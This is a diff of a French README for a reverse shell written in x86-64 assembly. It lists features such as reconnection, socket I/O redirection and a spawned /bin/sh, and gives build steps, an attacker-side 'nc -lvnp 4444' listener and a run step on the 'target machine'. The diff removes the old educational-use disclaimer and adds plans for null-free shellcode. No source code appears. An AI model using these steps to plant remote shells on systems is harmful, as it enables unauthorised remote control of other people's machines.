@@ -1,74 +1,46 @@
-# Reverse Shell en Assembleur x86-64
 
-Ce projet est un reverse shell codé entièrement en assembleur 64 bits, qui se connecte automatiquement à une machine distante et ouvre un shell `/bin/sh` à travers cette connexion réseau.
+# 🐚 Reverse Shell en assembleur x86_64
 
----
+Ce projet implémente un reverse shell en assembleur x86-64. Il établit une connexion sortante vers une machine distante et ouvre un shell interactif sur cette connexion. L’IP et le port sont lus dynamiquement depuis un fichier `config.txt`.
 
 ## Fonctionnalités
 
-- Connexion sortante vers une machine attaquante (IP/port donnés par l’utilisateur)
-- Ouverture d’un shell `/bin/sh` via la connexion
-- Lecture de l’IP et du port depuis l'entrée standard (`stdin`)
-- Tentatives de reconnexion toutes les 5 secondes si l’attaquant n’est pas disponible
-- Affichage d’un petit message de bienvenue une fois connecté
+- Connexion TCP sortante vers une IP et un port définis dans un fichier.
+- Lecture automatique de l’IP et du port depuis `config.txt` (format `127.0.0.1:4444`).
+- Construction de la structure `sockaddr_in` à partir des données lues.
+- Tentatives de reconnexion toutes les 5 secondes si la machine distante n’est pas en écoute.
+- Redirection des entrées/sorties vers le socket (stdin, stdout, stderr).
+- Affichage d’un petit message d’accueil en couleur à la connexion.
+- Exécution du shell `/bin/sh`.
 
----
+## Compilation et exécution
 
-## Compilation
+### 1. Contenu du fichier `config.txt`
 
-Pour compiler le programme :
+```
+127.0.0.1:4444
+```
+
+### 2. Compilation du code
 
 ```bash
 nasm -f elf64 reverse_shell.asm -o reverse_shell.o
 ld reverse_shell.o -o reverse_shell
 ```
 
----
-
-## Utilisation
-
-Sur la machine attaquante (listener) :
+### 3. Lancement du listener sur l’attaquant
 
 ```bash
 nc -lvnp 4444
 ```
 
-Sur la machine victime :
+### 4. Exécution sur la machine cible
 
 ```bash
 ./reverse_shell
 ```
 
-On vous demandera de saisir l’adresse IP et le port de la machine à contacter.
+## Pour aller plus loin
 
----
-
-## Détails techniques
-
-Le programme utilise uniquement des appels systèmes (`syscall`), sans aucune fonction de la libc.  
-L'IP et le port sont parsés manuellement, convertis, puis insérés dans une structure `sockaddr_in`.  
-Une boucle de reconnexion est prévue si la machine attaquante n’est pas en écoute.
-
----
-
-## Bonus ajoutés
-
-- Lecture dynamique de l’IP/port depuis l’entrée standard
-- Bannière en couleur affichée à la connexion
-- Gestion simple des erreurs + reconnexion automatique
-
----
-
-## À améliorer (futures idées)
-
-- Ajouter la possibilité de lire un fichier `config.txt` en option
-- Générer une version shellcode sans nullbytes
-- Ajouter la prise en charge de variables d’environnement (pour `execve`)
-- Rendre le shell plus interactif (terminal propre, etc.)
-
----
-
-## Attention
-
-Ce projet est à but uniquement éducatif.  
-Il ne doit pas être utilisé sur des systèmes que vous ne possédez pas ou sans autorisation.
+- Extraction du shellcode brut sans `\x00` depuis le binaire.
+- Optimisation de la taille du shellcode.
